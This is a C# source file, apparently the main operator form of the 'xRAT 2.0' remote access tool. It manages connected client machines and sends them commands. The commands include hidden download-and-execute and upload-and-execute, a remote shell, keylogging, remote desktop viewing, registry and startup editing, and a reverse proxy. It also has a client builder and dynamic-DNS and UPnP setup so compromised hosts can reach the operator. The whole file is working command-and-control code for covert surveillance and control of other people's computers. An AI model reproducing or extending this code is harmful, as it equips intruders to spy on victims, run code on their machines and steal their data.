﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Commands;
using xServer.Core.Extensions;
using xServer.Core.Helper;
using xServer.Core.Misc;
using xServer.Core.Packets;
using xServer.Core.ReverseProxy;
using xServer.Settings;

namespace xServer.Forms
{
    public partial class FrmMain : Form
    {
        public Server ListenServer;
        private readonly ListViewColumnSorter _lvwColumnSorter;
        public static volatile FrmMain Instance;

        private void ReadSettings(bool writeIfNotExist = true)
        {
            if (writeIfNotExist)
                XMLSettings.WriteDefaultSettings();

            XMLSettings.ListenPort = ushort.Parse(XMLSettings.ReadValue("ListenPort"));
            XMLSettings.ShowToU = bool.Parse(XMLSettings.ReadValue("ShowToU"));
            XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
            XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
            XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));

            XMLSettings.ShowToolTip = bool.Parse(XMLSettings.ReadValueSafe("ShowToolTip", "False"));
            XMLSettings.IntegrateNoIP = bool.Parse(XMLSettings.ReadValueSafe("EnableNoIPUpdater", "False"));
            XMLSettings.NoIPHost = XMLSettings.ReadValueSafe("NoIPHost");
            XMLSettings.NoIPUsername = XMLSettings.ReadValueSafe("NoIPUsername");
            XMLSettings.NoIPPassword = XMLSettings.ReadValueSafe("NoIPPassword");

            XMLSettings.Password = XMLSettings.ReadValue("Password");
        }

        private void ShowTermsOfService(bool show)
        {
            if (show)
            {
                using (var frm = new FrmTermsOfUse())
                {
                    frm.ShowDialog();
                }
                Thread.Sleep(300);
            }
        }

        public FrmMain()
        {
            Instance = this;

            ReadSettings();

#if !DEBUG
            ShowTermsOfService(XMLSettings.ShowToU);
#endif

            InitializeComponent();

            this.Menu = mainMenu;

            _lvwColumnSorter = new ListViewColumnSorter();
            lstClients.ListViewItemSorter = _lvwColumnSorter;

            lstClients.RemoveDots();
            lstClients.ChangeTheme();
        }

        public void UpdateWindowTitle(int count, int selected)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
#if DEBUG
                    if (selected > 0)
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}] - Threads: {2}", count,
                            selected, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
                    else
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} - Threads: {1}", count,
                            System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
#else
                    if (selected > 0)
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", count, selected);
                    else
                        this.Text = string.Format("xRAT 2.0 - Connected: {0}", count);
#endif
                });
            }
            catch
            {
            }
        }

        private void InitializeServer()
        {
            ListenServer = new Server();

            ListenServer.AddTypesToSerializer(typeof (IPacket), new Type[]
            {
                typeof (Core.Packets.ServerPackets.InitializeCommand),
                typeof (Core.Packets.ServerPackets.Disconnect),
                typeof (Core.Packets.ServerPackets.Reconnect),
                typeof (Core.Packets.ServerPackets.Uninstall),
                typeof (Core.Packets.ServerPackets.DownloadAndExecute),
                typeof (Core.Packets.ServerPackets.UploadAndExecute),
                typeof (Core.Packets.ServerPackets.Desktop),
                typeof (Core.Packets.ServerPackets.GetProcesses),
                typeof (Core.Packets.ServerPackets.KillProcess),
                typeof (Core.Packets.ServerPackets.StartProcess),
                typeof (Core.Packets.ServerPackets.Drives),
                typeof (Core.Packets.ServerPackets.Directory),
                typeof (Core.Packets.ServerPackets.DownloadFile),
                typeof (Core.Packets.ServerPackets.MouseClick),
                typeof (Core.Packets.ServerPackets.GetSystemInfo),
                typeof (Core.Packets.ServerPackets.VisitWebsite),
                typeof (Core.Packets.ServerPackets.ShowMessageBox),
                typeof (Core.Packets.ServerPackets.Update),
                typeof (Core.Packets.ServerPackets.Monitors),
                typeof (Core.Packets.ServerPackets.ShellCommand),
                typeof (Core.Packets.ServerPackets.Rename),
                typeof (Core.Packets.ServerPackets.Delete),
                typeof (Core.Packets.ServerPackets.Action),
                typeof (Core.Packets.ServerPackets.GetStartupItems),
                typeof (Core.Packets.ServerPackets.AddStartupItem),
                typeof (Core.Packets.ServerPackets.RemoveStartupItem),
                typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                typeof (Core.Packets.ServerPackets.GetLogs),
                typeof (Core.Packets.ClientPackets.Initialize),
                typeof (Core.Packets.ClientPackets.Status),
                typeof (Core.Packets.ClientPackets.UserStatus),
                typeof (Core.Packets.ClientPackets.DesktopResponse),
                typeof (Core.Packets.ClientPackets.GetProcessesResponse),
                typeof (Core.Packets.ClientPackets.DrivesResponse),
                typeof (Core.Packets.ClientPackets.DirectoryResponse),
                typeof (Core.Packets.ClientPackets.DownloadFileResponse),
                typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
                typeof (Core.Packets.ClientPackets.MonitorsResponse),
                typeof (Core.Packets.ClientPackets.ShellCommandResponse),
                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
                typeof (Core.Packets.ClientPackets.GetLogsResponse),
                typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (Core.ReverseProxy.Packets.ReverseProxyData),
                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
            });

            ListenServer.ServerState += ServerState;
            ListenServer.ClientState += ClientState;
            ListenServer.ClientRead += ClientRead;
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();

            if (XMLSettings.AutoListen)
            {
                if (XMLSettings.UseUPnP)
                    UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
                ListenServer.Listen(XMLSettings.ListenPort);
            }

            if (XMLSettings.IntegrateNoIP)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (ListenServer.Listening)
                ListenServer.Disconnect();

            if (UPnP.IsPortForwarded)
                UPnP.RemovePort();

            nIcon.Visible = false;
            Instance = null;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle(ListenServer.ConnectedClients, lstClients.SelectedItems.Count);
        }

        private void ServerState(Server server, bool listening)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate { botListen.Text = "Listening: " + listening.ToString(); });
            }
            catch
            {
            }
        }

        private void ClientState(Server server, Client client, bool connected)
        {
            if (connected)
            {
                client.Value = new UserState();
                // Initialize the UserState so we can store values in there if we need to.

                new Core.Packets.ServerPackets.InitializeCommand().Execute(client);
            }
            else
            {
                int selectedClients = 0;
                this.Invoke((MethodInvoker) delegate
                {
                    foreach (ListViewItem lvi in lstClients.Items)
                    {
                        if ((Client) lvi.Tag == client)
                        {
                            lvi.Remove();
                            server.ConnectedClients--;
                        }
                    }
                    selectedClients = lstClients.SelectedItems.Count;
                });
                UpdateWindowTitle(ListenServer.ConnectedClients, selectedClients);
            }
        }

        private void ClientRead(Server server, Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (!client.Value.IsAuthenticated)
            {
                if (type == typeof (Core.Packets.ClientPackets.Initialize))
                    CommandHandler.HandleInitialize(client, (Core.Packets.ClientPackets.Initialize) packet);
                else
                    return;
            }

            if (type == typeof (Core.Packets.ClientPackets.Status))
            {
                CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.UserStatus))
            {
                CommandHandler.HandleUserStatus(client, (Core.Packets.ClientPackets.UserStatus) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.DesktopResponse))
            {
                CommandHandler.HandleRemoteDesktopResponse(client, (Core.Packets.ClientPackets.DesktopResponse) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.GetProcessesResponse))
            {
                CommandHandler.HandleGetProcessesResponse(client,
                    (Core.Packets.ClientPackets.GetProcessesResponse) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.DrivesResponse))
            {
                CommandHandler.HandleDrivesResponse(client, (Core.Packets.ClientPackets.DrivesResponse) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.DirectoryResponse))
            {
                CommandHandler.HandleDirectoryResponse(client, (Core.Packets.ClientPackets.DirectoryResponse) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.DownloadFileResponse))
            {
                CommandHandler.HandleDownloadFileResponse(client,
                    (Core.Packets.ClientPackets.DownloadFileResponse) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.GetSystemInfoResponse))
            {
                CommandHandler.HandleGetSystemInfoResponse(client,
                    (Core.Packets.ClientPackets.GetSystemInfoResponse) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.MonitorsResponse))
            {
                CommandHandler.HandleMonitorsResponse(client, (Core.Packets.ClientPackets.MonitorsResponse) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.ShellCommandResponse))
            {
                CommandHandler.HandleShellCommandResponse(client,
                    (Core.Packets.ClientPackets.ShellCommandResponse) packet);
            }
            else if (type == typeof (Core.Packets.ClientPackets.GetStartupItemsResponse))
            {
                CommandHandler.HandleGetStartupItemsResponse(client, 
                    (Core.Packets.ClientPackets.GetStartupItemsResponse) packet);
            }
            else if (type == typeof(Core.Packets.ClientPackets.GetLogsResponse))
            {
                CommandHandler.HandleGetLogsResponse(client, (Core.Packets.ClientPackets.GetLogsResponse) packet);
            }
            else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                    type == typeof(Core.ReverseProxy.Packets.ReverseProxyData) ||
                    type == typeof(Core.ReverseProxy.Packets.ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
        }

        private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == _lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (_lvwColumnSorter.Order == SortOrder.Ascending)
                    _lvwColumnSorter.Order = SortOrder.Descending;
                else
                    _lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                _lvwColumnSorter.SortColumn = e.Column;
                _lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstClients.Sort();
        }

        #region "ContextMenu"

        #region "Connection"

        private void ctxtUpdate_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        if (Core.Misc.Update.UseDownload)
                        {
                            foreach (ListViewItem lvi in lstClients.SelectedItems)
                            {
                                Client c = (Client)lvi.Tag;
                                new Core.Packets.ServerPackets.Update(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                            }
                        }
                        else
                        {
                            new Thread(() =>
                            {
                                List<Client> clients = new List<Client>();

                                this.lstClients.Invoke((MethodInvoker) delegate
                                {
                                    clients.AddRange(from ListViewItem item in lstClients.SelectedItems select (Client)item.Tag);
                                });

                                bool error = false;
                                foreach (Client c in clients)
                                {
                                    if (c == null) continue;
                                    if (error) continue;

                                    FileSplit srcFile = new FileSplit(Core.Misc.Update.UploadPath);
                                    var fileName = Helper.GetRandomFilename(8, ".exe");
                                    if (srcFile.MaxBlocks < 0)
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }

                                    int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)

                                    CommandHandler.HandleStatus(c,
                                        new Core.Packets.ClientPackets.Status("Uploading file..."));

                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                    {
                                        byte[] block;
                                        if (!srcFile.ReadBlock(currentBlock, out block))
                                        {
                                            MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                                "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            error = true;
                                            break;
                                        }
                                        new Core.Packets.ServerPackets.Update(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                    }
                                }
                            }).Start();
                        }
                    }
                }
            }
        }

        private void ctxtDisconnect_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                Client c = (Client) lvi.Tag;
                new Core.Packets.ServerPackets.Disconnect().Execute(c);
            }
        }

        private void ctxtReconnect_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                Client c = (Client) lvi.Tag;
                new Core.Packets.ServerPackets.Reconnect().Execute(c);
            }
        }

        private void ctxtUninstall_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client) lvi.Tag;
                    new Core.Packets.ServerPackets.Uninstall().Execute(c);
                }
            }
        }

        #endregion

        #region "System"

        private void ctxtSystemInformation_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmSi != null)
                {
                    c.Value.FrmSi.Focus();
                    return;
                }
                FrmSystemInformation frmSI = new FrmSystemInformation(c);
                frmSI.Show();
            }
        }

        private void ctxtFileManager_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmFm != null)
                {
                    c.Value.FrmFm.Focus();
                    return;
                }
                FrmFileManager frmFM = new FrmFileManager(c);
                frmFM.Show();
            }
        }

        private void ctxtRegistryEditor_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client)lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmRe != null)
                {
                    c.Value.FrmRe.Focus();
                    return;
                }
                FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
                frmRE.Show();
            }
        }

        private void ctxtStartupManager_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmStm != null)
                {
                    c.Value.FrmStm.Focus();
                    return;
                }
                FrmStartupManager frmStm = new FrmStartupManager(c);
                frmStm.Show();
            }
        }

        private void ctxtTaskManager_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmTm != null)
                {
                    c.Value.FrmTm.Focus();
                    return;
                }
                FrmTaskManager frmTM = new FrmTaskManager(c);
                frmTM.Show();
            }
        }

        private void ctxtRemoteShell_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmRs != null)
                {
                    c.Value.FrmRs.Focus();
                    return;
                }
                FrmRemoteShell frmRS = new FrmRemoteShell(c);
                frmRS.Show();
            }
        }

        private void ctxtReverseProxy_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmProxy != null)
                {
                    c.Value.FrmProxy.Focus();
                    return;
                }

                FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                frmRS.Show();
            }
        }

        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            for (int i = 0; i < lstClients.SelectedItems.Count; i++)
            {
                clients.Add((Client) lstClients.SelectedItems[i].Tag);
            }
            return clients.ToArray();
        }

        private void ctxtShutdown_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client) lvi.Tag;
                    new Core.Packets.ServerPackets.Action(0).Execute(c);
                }
            }
        }

        private void ctxtRestart_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client) lvi.Tag;
                    new Core.Packets.ServerPackets.Action(1).Execute(c);
                }
            }
        }

        private void ctxtStandby_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client) lvi.Tag;
                    new Core.Packets.ServerPackets.Action(2).Execute(c);
                }
            }
        }

        #endregion

        #region "Surveillance"

        private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmRdp != null)
                {
                    c.Value.FrmRdp.Focus();
                    return;
                }
                FrmRemoteDesktop frmRDP = new FrmRemoteDesktop(c);
                frmRDP.Show();
            }
        }

        private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                // TODO
            }
        }

        private void ctxtKeylogger_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client)lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmKl != null)
                {
                    c.Value.FrmKl.Focus();
                    return;
                }
                FrmKeylogger frmKL = new FrmKeylogger(c);
                frmKL.Show();
            }
        }

        #endregion

        #region "Miscellaneous"

        private void ctxtLocalFile_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                {
                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
                    {
                        new Thread(() =>
                        {
                            List<Client> clients = new List<Client>();

                            this.lstClients.Invoke((MethodInvoker)delegate
                            {
                                clients.AddRange(from ListViewItem item in lstClients.SelectedItems select (Client)item.Tag);
                            });

                            bool error = false;
                            foreach (Client c in clients)
                            {
                                if (c == null) continue;
                                if (error) continue;

                                FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
                                if (srcFile.MaxBlocks < 0)
                                {
                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                        "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    error = true;
                                    break;
                                }

                                int ID = new Random().Next(int.MinValue, int.MaxValue - 1337); // ;)

                                CommandHandler.HandleStatus(c,
                                    new Core.Packets.ClientPackets.Status("Uploading file..."));

                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                {
                                    byte[] block;
                                    if (!srcFile.ReadBlock(currentBlock, out block))
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }
                                    new Core.Packets.ServerPackets.UploadAndExecute(ID,
                                        Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                        currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                }
                            }
                        }).Start();
                    }
                }
            }
        }

        private void ctxtWebFile_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            Client c = (Client) lvi.Tag;
                            new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL,
                                DownloadAndExecute.RunHidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtVisitWebsite_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            Client c = (Client) lvi.Tag;
                            new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtShowMessagebox_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                Client c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmSm != null)
                {
                    c.Value.FrmSm.Focus();
                    return;
                }
                FrmShowMessagebox frmSM = new FrmShowMessagebox(c);
                frmSM.Show();
            }
        }

        #endregion

        #endregion

        #region "MenuStrip"

        private void menuClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void menuSettings_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void menuBuilder_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
        }

        private void menuStatistics_Click(object sender, EventArgs e)
        {
            if (ListenServer.BytesReceived == 0 || ListenServer.BytesSent == 0)
                MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            else
            {
                using (
                    var frm = new FrmStatistics(ListenServer.BytesReceived, ListenServer.BytesSent,
                        ListenServer.ConnectedClients, ListenServer.AllTimeConnectedClients.Count))
                {
                    frm.ShowDialog();
                }
            }
        }

        private void menuAbout_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void nIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion
    }
}